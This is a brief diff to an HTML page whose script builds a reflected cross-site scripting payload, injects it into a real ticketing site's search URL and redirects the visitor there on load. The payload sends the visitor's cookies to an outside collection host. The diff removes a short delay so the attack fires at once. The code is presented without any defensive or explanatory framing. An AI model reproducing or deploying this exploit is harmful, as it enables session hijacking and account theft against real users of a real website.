@@ -9,9 +9,7 @@
   var C2 = 'https://1e5t945y.requestrepo.com'; 
   var PAYLOAD = '<script>window.location.href="' + C2 + '/?c="+encodeURIComponent(document.cookie)<\/script>';
   var TARGET = 'https://www.livenation.co.uk/search?query=' + encodeURIComponent(PAYLOAD);
-  setTimeout(function() {
-    window.location.href = TARGET;
-  }, 100);
+  window.location.href = TARGET;
 </script>
 </body>
 </html>
